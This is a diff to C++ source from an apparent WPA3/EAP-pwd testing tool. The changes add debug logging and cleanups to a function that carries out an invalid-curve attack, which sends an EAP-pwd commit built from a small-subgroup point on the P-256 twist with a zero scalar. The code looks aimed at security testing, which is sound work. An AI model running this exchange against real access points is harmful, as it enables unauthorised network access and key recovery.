@@ -30,9 +30,11 @@ using namespace wpa3_tester::reflection;
 
 namespace wpa3_tester::invalid_curve {
 
-// === Subgroup parameters for P-256 (group 19) invalid curve attack ===
-// Generator of small-order subgroup on the quadratic twist of P-256.
-// Source: dragonslayer src/crypto/crypto_openssl.c (size=269 path)
+// === subgroup parameters for P-256 (group 19) ===
+// generator of small-order subgroup on the quadratic twist of P-256.
+// source: dragonslayer src/crypto/crypto_openssl.c (size=269 path)
+
+//TODO popsat v dokumnetaci d'vod pro konkrétní
 static constexpr array<uint8_t, 32> SUB_GX = {
     0x6b,0xfe,0x1a,0x57,0x02,0x46,0x8a,0xc7,0xe2,0xe7,0xef,0xd2,0x2a,0x25,0xcc,0xf5,
     0x1a,0xda,0xbf,0x60,0xd3,0x85,0x17,0x33,0x2f,0x07,0xd2,0x2f,0x9a,0x88,0x75,0x55
@@ -161,28 +163,43 @@ bool run_invalid_curve_exchange(MonitorSocket& sock, const Channel& channel,
                                 string_view ssid, string_view identity, seconds timeout)
 {
     const milliseconds step{3000};
-    if (!do_auth (sock, channel, our_mac, ap_mac, step))       return false;
+    if (!do_auth(sock, channel, our_mac, ap_mac, step)) return false;
     if (!do_assoc(sock, channel, our_mac, ap_mac, ssid, step)) return false;
 
     pcap_t* handle = sock.get_pcap_handle();
-    const auto deadline = steady_clock::now() + timeout;
-    auto rem = [&]{ return duration_cast<milliseconds>(deadline - steady_clock::now()); };
+    log(LogLevel::DEBUG, "ic: auth+assoc done, entering EAPOL wait");
 
     auto wait_eapol = [&](auto pred) -> optional<vector<uint8_t>> {
         optional<vector<uint8_t>> out;
-        (void)components::poll_sniffer<bool>(handle, rem(),
-            [&](const u_char* p, uint32_t caplen) -> optional<bool> {
+        uint32_t n_frames = 0, n_eapol = 0;
+        (void)components::poll_sniffer<bool>(handle, timeout,
+            [&](const u_char* p, const uint32_t caplen) -> optional<bool> {
+                ++n_frames;
+                if (n_frames <= 5 || n_frames % 200 == 0) {
+                    const uint16_t rt_len = caplen >= 4u
+                        ? static_cast<uint16_t>(p[2] | (static_cast<uint16_t>(p[3]) << 8)) : 0;
+                    const int fc0 = (caplen > rt_len) ? p[rt_len] : 0;
+                    log(LogLevel::DEBUG, "ic frame {}: caplen={} fc0={}",
+                        static_cast<int>(n_frames), static_cast<int>(caplen), fc0);
+                }
                 auto eapol = extract_eapol(p, caplen, our_mac);
                 if (eapol.empty()) return nullopt;
+                ++n_eapol;
+                const int eap_code = eapol.size() > 4 ? eapol[4] : 0;
+                const int eap_type = eapol.size() > 8 ? eapol[8] : 0;
+                log(LogLevel::DEBUG, "ic EAPOL {}: code={} type={}",
+                    static_cast<int>(n_eapol), eap_code, eap_type);
                 if (is_eap_success(eapol)) { out = vector<uint8_t>{}; return true; }
                 if (!pred(eapol)) return nullopt;
                 out = std::move(eapol);
                 return true;
             });
+        log(LogLevel::DEBUG, "ic wait_eapol done: {} raw frames, {} eapol",
+            static_cast<int>(n_frames), static_cast<int>(n_eapol));
         return out;
     };
 
-    // EAP-Identity
+	// EAP-Identity
 	{
 		uint8_t eap_id = 0;
 		const auto e = wait_eapol([&](const vector<uint8_t>& v){ return is_identity_request(v, eap_id); });
@@ -208,13 +225,13 @@ bool run_invalid_curve_exchange(MonitorSocket& sock, const Channel& channel,
     {
         optional<EapPwdFrame> frame;
         const auto e = wait_eapol([&](const vector<uint8_t>& v){
-            auto f = parse_eap_pwd(v);
+            const auto f = parse_eap_pwd(v);
             if (f && f->opcode == PWD_OPCODE_COMMIT) { frame = f; return true; }
             return false;
         });
         if (!e || e->empty()) { log(LogLevel::WARNING, "No EAP-PWD-Commit request"); return false; }
         if (frame->pwd_data.size() < 96) {
-            log(LogLevel::WARNING, "Server commit payload too short ({} bytes)", frame->pwd_data.size());
+            log(LogLevel::WARNING, "Server commit payload too short ({} bytes)", static_cast<int>(frame->pwd_data.size()));
             return false;
         }
         copy_n(frame->pwd_data.begin(),      64, server_elem.begin());
@@ -224,7 +241,8 @@ bool run_invalid_curve_exchange(MonitorSocket& sock, const Channel& channel,
         array<uint8_t, 96> commit_payload{};
         ranges::copy(SUB_GX, commit_payload.begin());
         ranges::copy(SUB_GY, commit_payload.begin() + 32);
-        // scalar stays zero
+
+    	// scalar stays zero
         log(LogLevel::INFO, "Sending invalid commit (scalar=0, element=subgroup_gen)");
         send_eapol(sock, channel, our_mac, ap_mac,
                    make_pwd_eapol(frame->eap_id, PWD_OPCODE_COMMIT, commit_payload.data(), 96));
@@ -234,7 +252,7 @@ bool run_invalid_curve_exchange(MonitorSocket& sock, const Channel& channel,
     {
         optional<EapPwdFrame> frame;
         const auto e = wait_eapol([&](const vector<uint8_t>& v){
-            auto f = parse_eap_pwd(v);
+            const auto f = parse_eap_pwd(v);
             if (f && f->opcode == PWD_OPCODE_CONFIRM) { frame = f; return true; }
             return false;
         });
@@ -291,7 +309,7 @@ void run_attack(RunStatus& rs) {
     const string iface    = attacker.get(SK::iface);
     const string identity = att_cfg.at("identity").get<string>();
     const string ssid     = ap_actor->get(SK::ssid);
-    const Channel channel = ap_actor->get_channel();
+    const auto channel = ap_actor->get_channel();
 
     const HWAddress<6> our_mac(attacker.get(SK::mac));
     const HWAddress<6> ap_mac(ap_actor.get(SK::mac));
